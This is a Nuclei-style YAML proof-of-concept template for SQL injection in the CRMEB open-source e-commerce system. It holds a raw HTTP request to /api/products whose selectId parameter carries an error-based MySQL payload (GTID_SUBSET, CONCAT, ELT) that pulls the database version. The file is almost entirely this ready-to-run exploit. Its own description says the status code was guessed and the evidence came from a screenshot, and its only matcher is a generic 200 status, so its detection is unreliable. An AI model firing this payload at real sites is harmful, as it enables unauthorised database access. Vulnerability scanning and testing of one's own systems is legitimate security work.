id: poc-qvcti4pat8eehkfl
info:
  name: CRMEB开源电商系统products SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,version()))),0x7e),3550) HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: keep-alive'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
